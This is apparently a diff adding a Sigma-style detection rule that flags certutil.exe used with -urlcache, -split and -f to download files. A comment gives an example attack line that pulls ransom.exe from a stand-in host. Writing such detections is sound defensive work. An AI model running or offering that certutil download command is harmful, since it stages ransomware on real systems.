@@ -1,0 +1,14 @@
+# Image: certutil.exe
+# Command Line: certutil -urlcache -split -f http://huntmeplz.com/ransom.exe ransom.exe
+
+title: Certutil Download
+description: certutil_file_ingress
+detection:
+    selection:
+        EventID: 1
+        Image|endswith: 'certutil.exe'
+        CommandLine|contains|all:
+        - '-urlcache'
+        - '-split'
+        - '-f'
+    condition: selection
